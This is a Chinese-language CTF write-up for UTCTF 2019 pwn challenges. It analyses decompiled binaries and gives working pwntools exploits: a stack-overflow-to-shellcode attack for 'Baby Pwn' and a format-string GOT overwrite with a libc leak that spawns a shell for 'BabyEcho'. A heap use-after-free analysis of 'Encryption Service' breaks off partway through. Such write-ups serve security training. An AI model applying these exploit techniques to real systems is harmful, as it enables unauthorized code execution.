# UTCTF2019
## pwn
### Baby Pwn
    nc stack.overflow.fail 9000
检查保护情况
    [*] '/home/kira/pwn/utctf/babypwn'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x400000)
        RWX:      Has RWX segments
可以看到什么保护都没开，这种情况一般优先考虑写shellcode的方式
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      welcome();
      do_calc();
      return printf("Goodbye %s\n", &name);
    }
主函数比较简单，一个welcome函数和一个calc函数。
    int welcome()
    {
      puts("Welcome to the UT calculator service");
      puts("What is your name?");
      gets(&name);
      return printf("Hello %s\n", &name);
    }
函数要求我们输入一个name，name存放在bss段，程序没有开PIE，地址可知，那么我们可以在这里写入shellcode。
    int do_calc()
    {
      char v1; // [rsp+0h] [rbp-90h]
      char nptr; // [rsp+40h] [rbp-50h]
      __int64 v3; // [rsp+78h] [rbp-18h]
      __int64 v4; // [rsp+80h] [rbp-10h]
      char v5; // [rsp+8Fh] [rbp-1h]
      printf("Enter an operation (+ - *): ");
      v5 = getchar();
      flush_stdin();
      if ( v5 != '*' && v5 != '+' && v5 != '-' )
      {
        puts("That's not a valid operation!");
        exit(0);
      }
      printf("Enter the first operand: ");
      gets(&nptr);
      v4 = atol(&nptr);
      printf("Enter the second operand: ");
      gets(&v1);
      v3 = atol(&v1);
      if ( v5 == 43 )
        return printf("The sum is: %ld\n", v4 + v3);
      if ( v5 == '-' )
        return printf("The difference is: %ld\n", v4 - v3);
      if ( v5 != '*' )
      {
        puts("How did I get here?");
        puts("Exiting..");
        exit(0);
      }
      return printf("The product is: %ld\n", v3 * v4);
    }
这里有两个溢出点，都是输入运算数的地方，我这里选择`gets(&v1)`作为溢出点，只要填充0x98个字符就可以覆盖ret了，这里需要需注意一下，程序会判断运算符是否为`+
- *`，如果不是就会`exit`，所以我们填充垃圾数据的时候注意不能把运算符（`v5`）改成其他字符。
    from pwn import *
    p = remote('stack.overflow.fail',9000)
    name_addr = 0x601080
    p.sendlineafter('name?\n',asm(shellcraft.sh())) 
    p.sendline('+')
    p.sendline('123')
    p.sendline('+'*0x98+p64(name_addr))
    p.interactive()
### BabyEcho
    I found this weird echo server. Can you find a vulnerability?
    nc stack.overflow.fail 9002
检查保护情况
    [*] '/home/kira/pwn/utctf/BabyEcho'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
程序比较简单，没有栈溢出，不过有一个很明显的格式化字符串漏洞。
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      char s; // [esp+1Ah] [ebp-3Eh]
      unsigned int v4; // [esp+4Ch] [ebp-Ch]
      v4 = __readgsdword(0x14u);
      setbuf(stdin, 0);
      setbuf(stdout, 0);
      puts("Give me a string to echo back.");
      fgets(&s, 50, stdin);
      printf(&s);
      exit(0);
    }
这里有一个坑，`s`的地址不是4字节最齐，动态调试一下会看得更清楚，在`0x08048593`处下一个断点，gdb调试一下：
由上图可见，有两个`a`是在`0xffffd458`处，所以我们格式化字符串进行任意地址写的时候，要注意填充两个字节以确保地址对齐。
思路整理：
  1. 由于题目不是while循环，第一步要先把`PI:EMAIL`改成`main`，令程序进入死循环
  2. 动态调试的时候发现栈中有`_IO_2_1_stdin_`的地址，可以用于泄露libc基址
  3. 把`PI:EMAIL`改成`system`，之后再次输入`/bin/sh`即可getshell。由于出题人没有给libc，尝试了好几个libc版本，才打远程成功，最后确认libc版本为`libc6-i386_2.23-0ubuntu10_amd64.so`。
    from pwn import *
    p = remote('stack.overflow.fail',9002)
    elf = ELF('./BabyEcho')
    libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')
    # overwrite PI:EMAIL
    main_addr = 0x804851B
    exit_got =  0x804A01C
    byte1 = main_addr & 0xff
    byte2 = (main_addr & 0xff00) >> 8
    payload = '%{}c%{}$hhn'.format(byte1,11+8)
    payload +=  '%{}c%{}$hhn'.format(byte2-byte1,11+9)
    payload = payload.ljust(34,'a')
    payload += p32(exit_got)+p32(exit_got+1)
    p.sendlineafter('back.\n',payload)
    # leak libc address
    p.sendlineafter('back.\n','%2$p')
    libc.address = int(p.readline(),16) - libc.sym['_IO_2_1_stdin_']
    # overwrite PI:EMAIL
    system_addr = libc.sym['system']
    byte1 = system_addr & 0xff
    byte2 = (system_addr & 0xffff00) >> 8
    payload = '%{}c%{}$hhn'.format(byte1,11+8)
    payload +=  '%{}c%{}$hn'.format(byte2-byte1,11+9)
    payload = payload.ljust(34,'a')
    payload += p32(elf.got['printf'])+p32(elf.got['printf']+1)
    p.sendlineafter('back.\n',payload)
    p.interactive()
### PPower enCryption
    nc stack.overflow.fail 9001
检查保护情况
    [*] '/home/kira/pwn/utctf/ppc'
        Arch:     powerpc64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x10000000)
        RWX:      Has RWX segments
### Encryption Service
    nc stack.overflow.fail 9004
检查保护情况
    [*] '/home/kira/pwn/utctf/Encryption_Service'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      const char *v3; // rdi
      int v5; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v6; // [rsp+18h] [rbp-8h]
      v6 = __readfsqword(0x28u);
      setbuf(stdin, 0LL);
      setbuf(stdout, 0LL);
      puts("What is your user id?");
      v3 = "%d%*c";
      __isoc99_scanf("%d%*c", &user_id);
      while ( 1 )
      {
        print_menu(v3);
        v3 = "%d%*c";
        __isoc99_scanf("%d%*c", &v5);
        switch ( v5 )
        {
          case 1:
            encrypt_string();
            break;
          case 2:
            remove_encrypted_string();
            break;
          case 3:
            view_messages();
            break;
          case 4:
            edit_encrypted_message();
            break;
          case 5:
            return 0;
          default:
            v3 = "Not a valid option";
            puts("Not a valid option");
            break;
        }
      }
    }
程序提供了4个功能分别是：
  1. 创建一个加密字符串，为一个0x28大小的结构体，需要选择加密方式，输入明文长度以及明文内容；
  2. 删除一个加密字符串，不会free掉创建的结构体，不过会把结构体中`freed`的标记位置为1，然后free掉明文和密文的内存；
  3. 打印已创建的加密字符串；
  4. 编辑一个加密字符串，可以重新输入明文；
加密字符串的结构体如下：
    struct message
    {
      char *plaintxt;
      char *ciphertxt;
      void *encrypt;
      void *print_info;
      __int32 isFreed;
      __int32 size;
    };
简单看了一下，程序没有明显的漏洞，不过有几个地方的处理逻辑值得留意一下。
  * encrypt_string函数（这里的`*&size[4]`应该是message结构体，但IDA把它和size连在一起，不知道如何修改类型，求知道的师傅告知一下）
    unsigned __int64 encrypt_string()
    {
      int v1; // [rsp+8h] [rbp-28h]
      char size[12]; // [rsp+Ch] [rbp-24h]
      char *plaintxt; // [rsp+18h] [rbp-18h]
      void *ciphertxt; // [rsp+20h] [rbp-10h]
      unsigned __int64 v5; // [rsp+28h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      print_encryption_menu();
      __isoc99_scanf("%d%*c", &v1);
      *&size[4] = create_info();  // 这里创建结构体
      if ( *&size[4] )
      {
        if ( v1 == 1 )
        {
          *(*&size[4] + 16LL) = key_encrypt;
          *(*&size[4] + 24LL) = print_key;
        }
        else
        {
          if ( v1 != 2 )  // 选择不存在的加密方式，直接退出
          {
            puts("Not a valid choice");
            return __readfsqword(0x28u) ^ v5;
          }
          *(*&size[4] + 16LL) = xor_encrypt;
          *(*&size[4] + 24LL) = print_xor;
        }
        printf("How long is your message?\n>", &v1);
        __isoc99_scanf("%d%*c", size);   // 可以输入负数
        *(*&size[4] + 36LL) = ++*size;
        plaintxt = malloc(*size);
        printf("Please enter your message: ", size);
        fgets(plaintxt, *size, stdin);
        **&size[4] = plaintxt;
        ciphertxt = malloc(*size);
        *(*&size[4] + 8LL) = ciphertxt;
        (*(*&size[4] + 16LL))(plaintxt, ciphertxt);
        printf("Your encrypted message is: %s\n", ciphertxt);
      }
      return __readfsqword(0x28u) ^ v5;
    }
单看输入点，使用的是`fgets`，长度也是限制得死死的，没有截断问题和溢出点。但是，留意一下整个流程，会发现一些问题：
  1. 函数在开始就直接创建一个结构体，而当我们选择一个错的加密方式直接退出后，但是创建的结构体并没有删除。由于函数提早退出，下面各种写入步骤全部跳过了，预留内存的数据没有改下，那我们就有UAF的可能性了。
  2. 输入明文长度的时候没有判断输入数字合法性，如果我们输入`-1`，那么最终`size=0`，就会出现`malloc(0)`的情况。同时`fgets`时的size为0，意味着不会读取任何数据，内存中的数据就不会更改，这样就可以绕过`fgets`末位加`\x00`截断的问题，从而泄露内存数据。
由于程序中没有`system`之类的函数，那么第一步还是考虑如何泄露libc基址，可以上述第二点漏洞进行，步骤如下：
  1. 创建一个加密字符串，明文长度为0x100；
  2. 删除此加密字符串，根据先free明文，后free密文的顺序，明文heap块的头会写入`main_arena+88`的地址，之后free密文后，两个unsorted bins会合并到top chunk；
  3. 创建一个加密字符串，明文长度为0（size输入`-1`），`malloc(0)`会创建一个0x20大小的chunk，由于`size=0`，`main_arena+88`的地址并不会被改写；
  4. `view_messages()`打印信息，就会把`main_arena+88`的地址泄露；
  * view_messages函数
    int view_messages()
    {
      struct message *v0; // rax
      signed int i; // [rsp+Ch] [rbp-4h]
      for ( i = 0; i isFreed;
          if ( !v0 )
          {
            printf("Message #%d\n", i);